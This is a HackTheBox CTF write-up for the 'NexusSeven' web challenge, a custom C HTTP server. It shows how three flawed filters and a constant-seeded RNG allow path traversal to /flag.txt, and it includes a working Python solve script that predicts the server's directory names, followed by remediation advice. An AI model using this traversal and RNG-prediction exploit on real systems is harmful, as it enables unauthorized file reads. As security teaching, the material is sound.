---
title: "NexusSeven"
date: 2027-06-02 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, path-traversal, lfi, predictable-rng, srand, c]
description: "An Easy Web challenge built on a hand-rolled C HTTP server. Three ad-hoc security filters are each individually broken, and the server itself creates a predictably-named scratch directory you can traverse through to read /flag.txt off the filesystem root."
---

## Overview

NexusSeven is an Easy Web challenge, but there is no framework, no database, and no
injection — just a single-file C HTTP server (`httpd.c`) serving static files out of
`/app`. The flag lives at `/flag.txt` (the filesystem root, not the web root). The path
to it is a [path traversal](https://cwe.mitre.org/data/definitions/22.html) that only
works once you defeat three home-grown filters that all *look* reasonable and are all
broken — with the final step handed to us by the server's own
[predictable random number generator](https://cwe.mitre.org/data/definitions/330.html).

## The technique

Reading the source, three checks stand between a request and an arbitrary file read.

### 1. The "no `../`" guard is written backwards

```c
if (!extension_is_allowed(ctx) || strstr("..", ctx->filepath) != NULL) {
    build_bad_http_response(ctx);          // 400
}
```

`strstr(haystack, needle)` — but the arguments are swapped. This asks "is `filepath` a
substring of the literal `".."`?", which is only ever true for `""`, `"."` or `".."`.
Real traversal payloads like `stats/../../flag.txt` sail straight through. **Traversal is
effectively unguarded;** the only real gate left is the extension allowlist.

### 2. The extension allowlist keys on the *first* dot

```c
const char *dot = strchr(ctx->filepath, '.');     // FIRST '.'
if (dot == NULL || dot == ctx->filepath) return;  // empty if path starts with '.'
strncpy(ctx->file_extension, dot + 1, 16);
// allowed iff file_extension starts with html/htm/txt/jpg/jpeg/png/pdf
```

This is what kills the obvious payloads:

- `../flag.txt` → first character is `.` → the guard returns → empty extension → **400**.
- `stats/../../flag.txt` → the first dot is inside `..` → extension `"./.."` → **400**.

Any leading `../` puts a dot *before* the filename's dot, so the extracted extension is
never valid. To pass the allowlist we must traverse **through a directory whose name's
first dot is `.txt`**, e.g. `dir.txt/../../flag.txt` — then the extracted extension
starts with `txt` and is allowed. Linux resolves `dir/..` physically, so that directory
has to actually exist.

### 3. The server builds that directory for us — with a predictable name

On every GET the server creates a per-request stats directory and reads the target file
*while that directory still exists*:

```c
build_stats_dir_name(base, stats_dir_path, ...); // -> "stats/<hex>_<basename>"
mkdir(stats_dir_path, 0700);                      // exists during this request
...
build_http_response(ctx);                          // fopen(ctx->filepath)
```

`<basename>` is the **last component of our own request path**, and `<hex>` is 16 chars
from a generator seeded once at startup:

```c
srand(0);                          // seeded ONCE, with a constant
uint8_t byte = rand() & 0xFF;      // 8 bytes -> 16 hex chars per request
```

`srand(0)` is fully deterministic (glibc maps seed `0` to `1`; the resulting low-byte
stream famously begins `67c6697351ff4aec…`). Each GET consumes exactly 8 `rand()` bytes,
so the suffix for request *k* since process start can be computed entirely offline.

## Solution

Request a path whose last component is `flag.txt` so the server creates
`stats/<hex>_flag.txt`, then traverse back through it to the root:

```
GET /stats/<predicted_hex>_flag.txt/../../../flag.txt HTTP/1.1
```

- basename `flag.txt` → the server creates `stats/<hex>_flag.txt`
- the first dot in the path is the `.txt` of `_flag.txt` → extension `txt` → allowed
- `/app/stats/<hex>_flag.txt/../../../flag.txt` resolves to `/flag.txt` → flag read

Restart the instance so the RNG state is fresh; then our k-th connection is server
request index *k* (each GET draws 8 bytes), so connection 0 baked with the index-0
suffix hits immediately.

`solve.py`:

```python
#!/usr/bin/env python3
import socket, sys, re

HOST = sys.argv[1]
PORT = int(sys.argv[2])

def glibc_rand_stream(seed):           # glibc random() TYPE_3; srand(0) -> seed 1
    if seed == 0:
        seed = 1
    r = [0] * 344
    r[0] = seed
    for i in range(1, 31):  r[i] = (16807 * r[i - 1]) % 2147483647
    for i in range(31, 34): r[i] = r[i - 31]
    for i in range(34, 344):r[i] = (r[i - 31] + r[i - 3]) & 0xFFFFFFFF
    i = 344
    while True:
        v = (r[i - 31] + r[i - 3]) & 0xFFFFFFFF
        r.append(v); i += 1
        yield v >> 1

def suffix_for_index(k):               # 8 rand bytes consumed per GET
    g = glibc_rand_stream(0)
    vals = [next(g) for _ in range((k + 1) * 8)]
    return "".join("%02x" % (v & 0xFF) for v in vals[k * 8:(k + 1) * 8])

def attempt(idx):
    path = "/stats/%s_flag.txt/../../../flag.txt" % suffix_for_index(idx)
    req = "GET %s HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n" % path
    s = socket.create_connection((HOST, PORT), timeout=8)
    s.sendall(req.encode())
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
    except socket.timeout:
        pass
    s.close()
    return data.decode(errors="replace")

for idx in range(0, 90):
    resp = attempt(idx)
    m = re.search(r"(HTB\{[^}]*\})", resp)
    if m:
        print("[+] index=%d  FLAG=%s" % (idx, m.group(1)))
        break
```

```bash
python3 solve.py <target-host> <target-port>
# [+] index=0  FLAG=HTB{...}
```

## Why it worked

Each filter looked plausible but was broken in isolation: a reversed-argument `strstr`
guard that protected nothing, an extension allowlist that keyed on the first dot instead
of the last, and a scratch directory whose name we could predict because the RNG was
seeded with a constant. The application itself manufactured the one `.txt`-named
directory we needed to satisfy the only filter that wasn't trivially bypassable.

## Fix / defense

- Resolve the final path with `realpath()` and verify it stays under the web root before
  `open()` — never trust string filters for traversal.
- Take the extension from the **last** dot (`strrchr`) and compare the whole token with
  `strcmp`, not a `strncmp` prefix.
- Fix or delete ad-hoc `..` substring checks (the reversed `strstr` made it dead code).
- Seed RNGs from a real entropy source (`getrandom()` / `/dev/urandom`), never
  `srand(0)`, and keep attacker-influenced, predictably-named scratch directories off any
  request-reachable path.
